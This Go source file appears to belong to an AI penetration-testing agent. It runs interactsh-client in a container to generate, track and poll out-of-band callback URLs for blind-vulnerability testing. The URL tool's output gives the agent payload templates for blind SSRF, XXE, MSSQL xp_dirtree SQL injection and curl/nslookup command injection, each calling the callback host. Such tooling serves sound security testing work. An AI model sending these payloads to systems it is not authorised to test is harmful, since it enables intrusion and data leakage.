package tools

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"strings"
	"sync"
	"time"

	"pentagi/pkg/database"
	"pentagi/pkg/docker"

	"github.com/docker/docker/api/types/container"
	"github.com/sirupsen/logrus"
)

const (
	defaultInteractshServer   = "oast.fun"
	interactshStartTimeout    = 30 * time.Second
	interactshOutputFile      = "/work/.oob-interactions.jsonl"
	interactshPidFile         = "/work/.interactsh.pid"
	interactshExecTimeout     = 15 * time.Second
	interactshMaxStartRetries = 3
	interactshRetryDelay      = 10 * time.Second
)

// interactshStartupWarning is injected into the agent chain when interactsh fails to start after all retries.
const interactshStartupWarning = "⚠ Interactsh OOB monitoring failed to start. " +
	"Blind injection testing will NOT detect out-of-band callbacks. " +
	"Adjust your testing strategy accordingly."

// InteractshGetURLAction is the argument schema for the interactsh_url tool
type InteractshGetURLAction struct {
	AttackID    string `json:"attack_id" jsonschema:"required" jsonschema_description:"A short unique identifier for this specific attack probe (e.g., 'ssrf-avatar', 'sqli-login', 'xxe-upload'). Used to correlate OOB callbacks back to the specific injection point. Use only lowercase letters, digits, and hyphens."`
	Description string `json:"description" jsonschema:"required" jsonschema_description:"Brief description of what this OOB URL will be used for (e.g., 'Testing blind SSRF in avatar URL parameter')"`
	Message     string `json:"message" jsonschema:"required,title=OOB URL request message" jsonschema_description:"Not so long message explaining what you want to test with this OOB callback URL, to send to the user in English"`
}

// InteractshPollAction is the argument schema for the interactsh_poll tool
type InteractshPollAction struct {
	Message string `json:"message" jsonschema:"required,title=Poll message" jsonschema_description:"Not so long message explaining why you are checking for OOB callbacks, to send to the user in English"`
}

// InteractshStatusAction is the argument schema for the interactsh_status tool
type InteractshStatusAction struct {
	Message string `json:"message" jsonschema:"required,title=Status message" jsonschema_description:"Not so long message explaining why you are checking OOB detection status, to send to the user in English"`
}

// PayloadLogEntry records when an OOB payload URL was generated and its intended use context.
// This allows correlating incoming callbacks with the specific injection point that triggered them.
type PayloadLogEntry struct {
	AttackID       string    `json:"attack_id"`
	Description    string    `json:"description"`
	OOBURL         string    `json:"oob_url"`
	ToolName       string    `json:"tool_name"`       // which tool used this URL (e.g., "terminal", "browser_navigate")
	TargetEndpoint string    `json:"target_endpoint"` // endpoint the payload was sent to (if known)
	Timestamp      time.Time `json:"timestamp"`
}

// interactshClient manages an interactsh-client process inside a container
type interactshClient struct {
	mu           sync.RWMutex
	flowID       int64
	taskID       *int64
	subtaskID    *int64
	baseURL      string // e.g., "xxxx.oast.fun"
	server       string // e.g., "oast.fun"
	running      bool
	containerLID string
	dockerClient docker.DockerClient
	tlp          TermLogProvider
	containerID  int64

	// Track registered attack IDs and their descriptions
	attacks map[string]string // attackID -> description

	// Payload correlation: log every generated URL with context for callback matching
	payloadLog []PayloadLogEntry
}

// NewInteractshTool creates a new interactsh tool instance.
// It does NOT start the client — call Start() to do that.
func NewInteractshTool(
	flowID int64,
	taskID, subtaskID *int64,
	containerID int64,
	containerLID string,
	dockerClient docker.DockerClient,
	tlp TermLogProvider,
	server string,
) *interactshClient {
	if server == "" {
		server = defaultInteractshServer
	}
	return &interactshClient{
		flowID:       flowID,
		taskID:       taskID,
		subtaskID:    subtaskID,
		containerID:  containerID,
		containerLID: containerLID,
		dockerClient: dockerClient,
		tlp:          tlp,
		server:       server,
		attacks:      make(map[string]string),
	}
}

// IsAvailable returns true if the interactsh tool can be used
func (ic *interactshClient) IsAvailable() bool {
	return ic.dockerClient != nil
}

// IsRunning returns true if the interactsh client has been started and has a base URL
func (ic *interactshClient) IsRunning() bool {
	ic.mu.RLock()
	defer ic.mu.RUnlock()
	return ic.running && ic.baseURL != ""
}

// GetBaseURL returns the base interactsh URL (e.g., "xxxx.oast.fun")
func (ic *interactshClient) GetBaseURL() string {
	ic.mu.RLock()
	defer ic.mu.RUnlock()
	return ic.baseURL
}

// GetAttacks returns a copy of the registered attacks map
func (ic *interactshClient) GetAttacks() map[string]string {
	ic.mu.RLock()
	defer ic.mu.RUnlock()
	result := make(map[string]string, len(ic.attacks))
	for k, v := range ic.attacks {
		result[k] = v
	}
	return result
}

// RecordPayloadContext records contextual information about where an OOB URL was used.
// Called by the performer when it detects a tool call argument containing an interactsh URL.
func (ic *interactshClient) RecordPayloadContext(attackID, toolName, targetEndpoint string) {
	ic.mu.Lock()
	defer ic.mu.Unlock()

	description := ic.attacks[attackID]
	oobURL := ""
	if ic.baseURL != "" {
		oobURL = sanitizeAttackID(attackID) + "." + ic.baseURL
	}

	ic.payloadLog = append(ic.payloadLog, PayloadLogEntry{
		AttackID:       attackID,
		Description:    description,
		OOBURL:         oobURL,
		ToolName:       toolName,
		TargetEndpoint: targetEndpoint,
		Timestamp:      time.Now(),
	})
}

// GetPayloadLog returns a copy of the payload log for correlation.
func (ic *interactshClient) GetPayloadLog() []PayloadLogEntry {
	ic.mu.RLock()
	defer ic.mu.RUnlock()

	result := make([]PayloadLogEntry, len(ic.payloadLog))
	copy(result, ic.payloadLog)
	return result
}

// correlateInteraction attempts to match an interaction with a logged payload.
func (ic *interactshClient) correlateInteraction(attackID string) *PayloadLogEntry {
	ic.mu.RLock()
	defer ic.mu.RUnlock()

	// Search payload log for matching attack ID (most recent first)
	for i := len(ic.payloadLog) - 1; i >= 0; i-- {
		if ic.payloadLog[i].AttackID == attackID {
			entry := ic.payloadLog[i]
			return &entry
		}
	}
	return nil
}

// checkProcessAlive verifies the interactsh-client process is actually running in the container.
// Returns true if the PID file exists AND the process is alive.
func (ic *interactshClient) checkProcessAlive(ctx context.Context) bool {
	containerName := PrimaryTerminalName(ic.flowID)
	checkCmd := fmt.Sprintf("test -f %s && kill -0 $(cat %s 2>/dev/null) 2>/dev/null && echo ALIVE || echo DEAD",
		interactshPidFile, interactshPidFile)
	result, err := ic.execInContainer(ctx, containerName, checkCmd, 5*time.Second)
	if err != nil {
		return false
	}
	return strings.Contains(strings.TrimSpace(result), "ALIVE")
}

// ensureRunning verifies that the interactsh process is actually alive.
// If the in-memory state says running but the process is dead, it resets state and attempts a restart.
// Returns true if interactsh is confirmed running after this call.
func (ic *interactshClient) ensureRunning(ctx context.Context) bool {
	if !ic.IsRunning() {
		return false
	}

	if ic.checkProcessAlive(ctx) {
		return true
	}

	// Process is dead but state says running — reset and try to restart
	logger := logrus.WithFields(logrus.Fields{
		"flow_id":   ic.flowID,
		"component": "interactsh",
	})
	logger.Warn("interactsh-client process died, resetting state and attempting restart")

	ic.mu.Lock()
	ic.running = false
	ic.baseURL = ""
	ic.mu.Unlock()

	// Attempt restart
	if err := ic.StartWithRetry(ctx); err != nil {
		logger.WithError(err).Error("failed to restart interactsh-client after process death")
		return false
	}
	return true
}

// StartWithRetry attempts to start interactsh-client with up to interactshMaxStartRetries attempts.
// Returns nil on success. On total failure, returns the last error and logs a prominent warning.
func (ic *interactshClient) StartWithRetry(ctx context.Context) error {
	logger := logrus.WithFields(logrus.Fields{
		"flow_id":   ic.flowID,
		"component": "interactsh",
	})

	var lastErr error
	for attempt := 1; attempt <= interactshMaxStartRetries; attempt++ {
		logger.WithField("attempt", attempt).Info("attempting to start interactsh-client")

		lastErr = ic.Start(ctx)
		if lastErr == nil {
			if attempt > 1 {
				logger.WithField("attempt", attempt).Info("interactsh-client started successfully after retry")
			}
			return nil
		}

		logger.WithError(lastErr).WithField("attempt", attempt).
			Warnf("interactsh-client start attempt %d/%d failed", attempt, interactshMaxStartRetries)

		if attempt < interactshMaxStartRetries {
			select {
			case <-ctx.Done():
				return fmt.Errorf("context cancelled during interactsh startup retry: %w", ctx.Err())
			case <-time.After(interactshRetryDelay):
				// continue to next attempt
			}
		}
	}

	logger.Error(interactshStartupWarning)

	// Log to terminal if TLP is available so the warning appears in the agent's context
	if ic.tlp != nil {
		formattedMsg := FormatTerminalSystemOutput(interactshStartupWarning)
		_, _ = ic.tlp.PutMsg(
			ctx,
			database.TermlogTypeStdout,
			formattedMsg,
			ic.containerID,
			ic.taskID,
			ic.subtaskID,
		)
	}

	return fmt.Errorf("interactsh-client failed to start after %d attempts: %w", interactshMaxStartRetries, lastErr)
}

// Start launches interactsh-client inside the container and captures the base URL.
func (ic *interactshClient) Start(ctx context.Context) error {
	ic.mu.Lock()
	defer ic.mu.Unlock()

	if ic.running {
		return nil
	}

	containerName := PrimaryTerminalName(ic.flowID)
	logger := logrus.WithFields(logrus.Fields{
		"flow_id":   ic.flowID,
		"container": containerName,
		"component": "interactsh",
	})

	// Check if interactsh-client is available in the container
	checkResult, err := ic.execInContainer(ctx, containerName, "which interactsh-client 2>/dev/null || echo 'NOT_FOUND'", 10*time.Second)
	if err != nil || strings.Contains(checkResult, "NOT_FOUND") {
		// Try installing via go install (likely available in Kali image)
		logger.Info("interactsh-client not found, attempting install")
		installCmd := "go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest 2>&1; which interactsh-client 2>/dev/null || echo 'INSTALL_FAILED'"
		installResult, installErr := ic.execInContainer(ctx, containerName, installCmd, 120*time.Second)
		if installErr != nil || strings.Contains(installResult, "INSTALL_FAILED") {
			logger.WithError(installErr).Warn("failed to install interactsh-client, OOB detection will be unavailable")
			return fmt.Errorf("interactsh-client not available and installation failed")
		}
	}

	// Start interactsh-client in the background
	startCmd := fmt.Sprintf(
		"nohup interactsh-client -server %s -o %s -json -v > /work/.interactsh-startup.log 2>&1 & echo $! > %s && sleep 4 && cat /work/.interactsh-startup.log",
		ic.server, interactshOutputFile, interactshPidFile,
	)

	startResult, err := ic.execInContainer(ctx, containerName, startCmd, interactshStartTimeout)
	if err != nil {
		logger.WithError(err).Error("failed to start interactsh-client")
		return fmt.Errorf("failed to start interactsh-client: %w", err)
	}

	// Parse the base URL from the startup output
	baseURL := parseInteractshBaseURL(startResult, ic.server)
	if baseURL == "" {
		// Retry reading the log after a short delay
		time.Sleep(3 * time.Second)
		retryResult, _ := ic.execInContainer(ctx, containerName, "cat /work/.interactsh-startup.log", 5*time.Second)
		baseURL = parseInteractshBaseURL(retryResult, ic.server)
	}

	if baseURL == "" {
		logger.WithField("output", startResult).Warn("could not parse base URL from interactsh-client output")
		return fmt.Errorf("failed to parse interactsh base URL from output")
	}

	ic.baseURL = baseURL
	ic.running = true

	logger.WithField("base_url", baseURL).Info("interactsh-client started successfully")

	return nil
}

// Stop kills the interactsh-client process inside the container
func (ic *interactshClient) Stop(ctx context.Context) error {
	ic.mu.Lock()
	defer ic.mu.Unlock()

	if !ic.running {
		return nil
	}

	containerName := PrimaryTerminalName(ic.flowID)
	logger := logrus.WithFields(logrus.Fields{
		"flow_id":   ic.flowID,
		"component": "interactsh",
	})

	// Kill the interactsh-client process
	stopCmd := fmt.Sprintf("kill $(cat %s 2>/dev/null) 2>/dev/null; rm -f %s %s /work/.interactsh-startup.log",
		interactshPidFile, interactshPidFile, interactshOutputFile)
	_, _ = ic.execInContainer(ctx, containerName, stopCmd, 10*time.Second)

	ic.running = false
	ic.baseURL = ""
	logger.Info("interactsh-client stopped")

	return nil
}

// Handle processes tool calls for all interactsh-related tools
func (ic *interactshClient) Handle(ctx context.Context, name string, args json.RawMessage) (string, error) {
	logger := logrus.WithContext(ctx).WithFields(enrichLogrusFields(ic.flowID, ic.taskID, ic.subtaskID, logrus.Fields{
		"tool": name,
		"args": string(args),
	}))

	switch name {
	case InteractshGetURLToolName:
		return ic.handleGetURL(ctx, logger, args)
	case InteractshPollToolName:
		return ic.handlePoll(ctx, logger, args)
	case InteractshStatusToolName:
		return ic.handleStatus(ctx, logger, args)
	default:
		return "", fmt.Errorf("unknown interactsh tool: %s", name)
	}
}

func (ic *interactshClient) handleGetURL(ctx context.Context, logger *logrus.Entry, args json.RawMessage) (string, error) {
	var action InteractshGetURLAction
	if err := json.Unmarshal(args, &action); err != nil {
		logger.WithError(err).Error("failed to unmarshal interactsh_url action")
		return "", fmt.Errorf("failed to unmarshal interactsh_url action: %w", err)
	}

	if !ic.IsRunning() {
		// Try to start on-demand with retries
		if err := ic.StartWithRetry(ctx); err != nil {
			return "⚠ OOB detection is NOT available: interactsh-client could not be started after " +
				fmt.Sprintf("%d", interactshMaxStartRetries) + " attempts. " +
				"Blind injection testing (blind SSRF, blind SQLi, blind XXE, blind RCE) will NOT detect out-of-band callbacks. " +
				"You can still perform active testing, but adjust your strategy to focus on in-band detection methods.", nil
		}
	}

	// Generate a unique OOB URL for this attack
	sanitizedID := sanitizeAttackID(action.AttackID)
	baseURL := ic.GetBaseURL()
	oobURL := fmt.Sprintf("%s.%s", sanitizedID, baseURL)

	ic.mu.Lock()
	ic.attacks[action.AttackID] = action.Description
	// Auto-log the payload generation event for correlation
	ic.payloadLog = append(ic.payloadLog, PayloadLogEntry{
		AttackID:    action.AttackID,
		Description: action.Description,
		OOBURL:      oobURL,
		ToolName:    "interactsh_url",
		Timestamp:   time.Now(),
	})
	ic.mu.Unlock()

	logger.WithFields(logrus.Fields{
		"attack_id": action.AttackID,
		"oob_url":   oobURL,
	}).Info("generated OOB callback URL")

	result := fmt.Sprintf("## OOB Callback URL Generated\n\n"+
		"**Attack ID:** `%s`\n"+
		"**OOB URL:** `%s`\n"+
		"**HTTP:** `http://%s`\n"+
		"**HTTPS:** `https://%s`\n"+
		"**DNS:** `%s` (any DNS lookup triggers callback)\n\n"+
		"### Usage in Payloads\n\n"+
		"- **Blind SSRF:** `curl \"https://target/api?url=http://%s\"`\n"+
		"- **Blind XXE:** `<!ENTITY xxe SYSTEM \"http://%s\">`\n"+
		"- **Blind SQLi (DNS):** `'; EXEC xp_dirtree '\\\\\\\\%s\\\\share'-- -`\n"+
		"- **Blind RCE:** `curl http://%s` or `nslookup %s`\n\n"+
		"Any DNS/HTTP/SMTP interaction with this URL will be automatically detected. "+
		"Use `%s` tool to check for received callbacks after sending your payloads.",
		action.AttackID, oobURL, oobURL, oobURL, oobURL,
		oobURL, oobURL, oobURL, oobURL, oobURL, InteractshPollToolName,
	)

	return result, nil
}

func (ic *interactshClient) handlePoll(ctx context.Context, logger *logrus.Entry, args json.RawMessage) (string, error) {
	var action InteractshPollAction
	if err := json.Unmarshal(args, &action); err != nil {
		logger.WithError(err).Error("failed to unmarshal interactsh_poll action")
		return "", fmt.Errorf("failed to unmarshal interactsh_poll action: %w", err)
	}

	if !ic.IsRunning() {
		return "OOB detection is not running. Use `interactsh_url` first to start the client and get a callback URL.", nil
	}

	// Verify the process is actually alive before trusting poll results
	if !ic.ensureRunning(ctx) {
		return "⚠ OOB detection process was found dead and could not be restarted. " +
			"Previous OOB callback URLs are no longer being monitored. " +
			"Use `interactsh_url` to request a new URL (this will attempt to restart the client).", nil
	}

	interactions, err := ic.PollInteractions(ctx)
	if err != nil {
		return fmt.Sprintf("Error polling OOB interactions: %v", err), nil
	}

	if len(interactions) == 0 {
		attacks := ic.GetAttacks()
		var sb strings.Builder
		sb.WriteString("## No OOB Interactions Detected\n\n")
		sb.WriteString("No callbacks received yet. This is normal — blind vulnerabilities may take time to trigger.\n\n")
		if len(attacks) > 0 {
			sb.WriteString("### Registered Attack Probes\n\n")
			for id, desc := range attacks {
				sb.WriteString(fmt.Sprintf("- **%s**: %s\n", id, desc))
			}
			sb.WriteString("\nContinue testing and poll again later.\n")
		}
		return sb.String(), nil
	}

	return formatInteractions(interactions), nil
}

func (ic *interactshClient) handleStatus(ctx context.Context, logger *logrus.Entry, args json.RawMessage) (string, error) {
	var action InteractshStatusAction
	if err := json.Unmarshal(args, &action); err != nil {
		logger.WithError(err).Error("failed to unmarshal interactsh_status action")
		return "", fmt.Errorf("failed to unmarshal interactsh_status action: %w", err)
	}

	ic.mu.RLock()
	running := ic.running
	baseURL := ic.baseURL
	attacks := make(map[string]string, len(ic.attacks))
	for k, v := range ic.attacks {
		attacks[k] = v
	}
	ic.mu.RUnlock()

	var sb strings.Builder
	sb.WriteString("## Interactsh OOB Detection Status\n\n")

	if !running {
		sb.WriteString("**Status:** ❌ Not running\n\n")
		sb.WriteString("Use `interactsh_url` to start the OOB detection client and get a callback URL.\n")
		return sb.String(), nil
	}

	sb.WriteString("**Status:** ✅ Running\n")
	sb.WriteString(fmt.Sprintf("**Base URL:** `%s`\n", baseURL))
	sb.WriteString(fmt.Sprintf("**Server:** `%s`\n", ic.server))
	sb.WriteString(fmt.Sprintf("**Registered Probes:** %d\n\n", len(attacks)))

	if len(attacks) > 0 {
		sb.WriteString("### Active Attack Probes\n\n")
		for id, desc := range attacks {
			sanitized := sanitizeAttackID(id)
			sb.WriteString(fmt.Sprintf("- **%s** → `%s.%s` — %s\n", id, sanitized, baseURL, desc))
		}
	}

	return sb.String(), nil
}

// PollInteractions reads the interactsh output file and returns any new interactions
func (ic *interactshClient) PollInteractions(ctx context.Context) ([]InteractshInteraction, error) {
	ic.mu.RLock()
	running := ic.running
	baseURL := ic.baseURL
	ic.mu.RUnlock()

	if !running {
		return nil, nil
	}

	// Verify the actual process is alive
	if !ic.checkProcessAlive(ctx) {
		logrus.WithField("flow_id", ic.flowID).
			Warn("interactsh-client process not alive during PollInteractions, marking as not running")
		ic.mu.Lock()
		ic.running = false
		// Keep baseURL for reference but mark as not running
		ic.mu.Unlock()
		return nil, fmt.Errorf("interactsh-client process is no longer running (PID not alive)")
	}

	containerName := PrimaryTerminalName(ic.flowID)

	// Read the interactions file (don't clear it — interactsh appends)
	readCmd := fmt.Sprintf("cat %s 2>/dev/null", interactshOutputFile)
	output, err := ic.execInContainer(ctx, containerName, readCmd, interactshExecTimeout)
	if err != nil || strings.TrimSpace(output) == "" {
		return nil, nil
	}

	// After reading, truncate the file so we don't re-process old interactions
	truncCmd := fmt.Sprintf(": > %s", interactshOutputFile)
	_, _ = ic.execInContainer(ctx, containerName, truncCmd, 5*time.Second)

	var interactions []InteractshInteraction
	scanner := bufio.NewScanner(strings.NewReader(output))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		var raw InteractshRawInteraction
		if err := json.Unmarshal([]byte(line), &raw); err != nil {
			logrus.WithError(err).WithField("line", line[:min(len(line), 200)]).
				Debug("failed to parse interactsh interaction line")
			continue
		}

		// Extract attack ID from the subdomain
		attackID := extractAttackID(raw.FullID, baseURL)

		ic.mu.RLock()
		description := ic.attacks[attackID]
		ic.mu.RUnlock()

		interaction := InteractshInteraction{
			AttackID:    attackID,
			Description: description,
			Protocol:    raw.Protocol,
			FullID:      raw.FullID,
			UniqueID:    raw.UniqueID,
			RawRequest:  raw.RawRequest,
			RawResponse: raw.RawResponse,
			RemoteAddr:  raw.RemoteAddress,
			Timestamp:   raw.Timestamp,
		}

		// Attempt payload correlation
		if correlated := ic.correlateInteraction(attackID); correlated != nil {
			interaction.CorrelatedToolName = correlated.ToolName
			interaction.CorrelatedTargetEndpoint = correlated.TargetEndpoint
			interaction.CorrelatedTimestamp = correlated.Timestamp.Format(time.RFC3339)
		}

		interactions = append(interactions, interaction)
	}

	return interactions, nil
}

// InteractshRawInteraction is the JSON structure that interactsh-client writes
type InteractshRawInteraction struct {
	Protocol      string `json:"protocol"`
	FullID        string `json:"full-id"`
	UniqueID      string `json:"unique-id"`
	RawRequest    string `json:"raw-request"`
	RawResponse   string `json:"raw-response"`
	RemoteAddress string `json:"remote-address"`
	Timestamp     string `json:"timestamp"`
}

// InteractshInteraction is a parsed and correlated interaction
type InteractshInteraction struct {
	AttackID    string `json:"attack_id"`
	Description string `json:"description"`
	Protocol    string `json:"protocol"`
	FullID      string `json:"full_id"`
	UniqueID    string `json:"unique_id"`
	RawRequest  string `json:"raw_request"`
	RawResponse string `json:"raw_response"`
	RemoteAddr  string `json:"remote_addr"`
	Timestamp   string `json:"timestamp"`

	// Payload correlation fields (populated when a matching PayloadLogEntry exists)
	CorrelatedToolName       string `json:"correlated_tool_name,omitempty"`
	CorrelatedTargetEndpoint string `json:"correlated_target_endpoint,omitempty"`
	CorrelatedTimestamp      string `json:"correlated_timestamp,omitempty"`
}

// parseInteractshBaseURL extracts the base URL from interactsh-client startup output
func parseInteractshBaseURL(output, server string) string {
	scanner := bufio.NewScanner(strings.NewReader(output))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		// interactsh-client prints: [INF] Listing 1 payload for OOB Testing
		// followed by: [INF] xxxx.oast.fun
		if strings.Contains(line, server) {
			parts := strings.Fields(line)
			for _, part := range parts {
				if strings.HasSuffix(part, "."+server) {
					return part
				}
			}
		}
	}
	return ""
}

// extractAttackID extracts the attack ID from a full interaction ID
// Full ID format: attackid.randomchars.baseurl or randomchars.baseurl
func extractAttackID(fullID, baseURL string) string {
	if baseURL == "" || fullID == "" {
		return "unknown"
	}

	// Remove the base URL suffix
	prefix := strings.TrimSuffix(fullID, "."+baseURL)
	if prefix == fullID {
		prefix = strings.TrimSuffix(fullID, baseURL)
		prefix = strings.TrimSuffix(prefix, ".")
	}

	if prefix == "" {
		return "direct"
	}

	// The first dot-separated segment is the attack ID
	parts := strings.SplitN(prefix, ".", 2)
	if len(parts) > 0 && parts[0] != "" {
		return parts[0]
	}

	return "unknown"
}

// execInContainer runs a command inside the container and returns the output
func (ic *interactshClient) execInContainer(ctx context.Context, containerName, command string, timeout time.Duration) (string, error) {
	if timeout <= 0 {
		timeout = interactshExecTimeout
	}

	execCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	createResp, err := ic.dockerClient.ContainerExecCreate(execCtx, containerName, container.ExecOptions{
		Cmd:          []string{"sh", "-c", command},
		AttachStdout: true,
		AttachStderr: true,
		WorkingDir:   docker.WorkFolderPathInContainer,
	})
	if err != nil {
		return "", fmt.Errorf("failed to create exec: %w", err)
	}

	resp, err := ic.dockerClient.ContainerExecAttach(execCtx, createResp.ID, container.ExecAttachOptions{
		Tty: true,
	})
	if err != nil {
		return "", fmt.Errorf("failed to attach to exec: %w", err)
	}
	defer resp.Close()

	var buf bytes.Buffer
	_, _ = io.Copy(&buf, resp.Reader)

	return buf.String(), nil
}

// formatInteractions formats a list of interactions into a markdown report
func formatInteractions(interactions []InteractshInteraction) string {
	var sb strings.Builder

	sb.WriteString("## 🚨 OOB Interactions Detected!\n\n")
	sb.WriteString(fmt.Sprintf("**%d interaction(s) received:**\n\n", len(interactions)))

	for i, interaction := range interactions {
		sb.WriteString(fmt.Sprintf("### Interaction %d\n\n", i+1))
		sb.WriteString(fmt.Sprintf("- **Attack ID:** `%s`\n", interaction.AttackID))
		if interaction.Description != "" {
			sb.WriteString(fmt.Sprintf("- **Description:** %s\n", interaction.Description))
		}
		sb.WriteString(fmt.Sprintf("- **Protocol:** `%s`\n", interaction.Protocol))
		sb.WriteString(fmt.Sprintf("- **Remote Address:** `%s`\n", interaction.RemoteAddr))
		sb.WriteString(fmt.Sprintf("- **Timestamp:** `%s`\n", interaction.Timestamp))
		sb.WriteString(fmt.Sprintf("- **Full ID:** `%s`\n", interaction.FullID))

		// Payload correlation details
		if interaction.CorrelatedToolName != "" {
			sb.WriteString(fmt.Sprintf("- **🔗 Correlated Tool:** `%s`\n", interaction.CorrelatedToolName))
			if interaction.CorrelatedTargetEndpoint != "" {
				sb.WriteString(fmt.Sprintf("- **🔗 Target Endpoint:** `%s`\n", interaction.CorrelatedTargetEndpoint))
			}
			if interaction.CorrelatedTimestamp != "" {
				sb.WriteString(fmt.Sprintf("- **🔗 Payload Sent At:** `%s`\n", interaction.CorrelatedTimestamp))
			}
		}

		if interaction.RawRequest != "" {
			request := interaction.RawRequest
			if len(request) > 2048 {
				request = request[:2048] + "\n... [truncated]"
			}
			sb.WriteString(fmt.Sprintf("\n**Raw Request:**\n```\n%s\n```\n", request))
		}

		if interaction.RawResponse != "" {
			response := interaction.RawResponse
			if len(response) > 1024 {
				response = response[:1024] + "\n... [truncated]"
			}
			sb.WriteString(fmt.Sprintf("\n**Raw Response:**\n```\n%s\n```\n", response))
		}

		sb.WriteString("\n---\n\n")
	}

	sb.WriteString("**⚠️ These interactions confirm out-of-band vulnerabilities!** ")
	sb.WriteString("Create findings for each confirmed interaction with appropriate severity.\n")

	return sb.String()
}

// sanitizeAttackID cleans an attack ID for use as a DNS subdomain label
func sanitizeAttackID(id string) string {
	id = strings.ToLower(id)
	id = strings.ReplaceAll(id, "_", "-")
	id = strings.ReplaceAll(id, " ", "-")

	var cleaned strings.Builder
	for _, r := range id {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') || r == '-' {
			cleaned.WriteRune(r)
		}
	}

	result := cleaned.String()
	result = strings.Trim(result, "-")

	// DNS label max length is 63, keep it practical
	if len(result) > 30 {
		result = result[:30]
	}

	if result == "" {
		result = "oob"
	}

	return result
}
